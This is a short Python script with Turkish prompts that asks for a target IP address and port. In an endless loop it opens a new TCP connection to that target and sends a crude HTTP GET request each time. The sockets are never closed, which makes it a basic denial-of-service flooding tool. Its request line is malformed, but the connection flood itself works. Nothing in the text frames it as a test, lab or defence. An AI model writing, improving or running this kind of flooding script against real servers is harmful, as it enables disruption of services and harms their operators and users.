import socket

target = input("Hedef IP adresini girin: ")
port = int(input("Hedef portu girin: "))

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
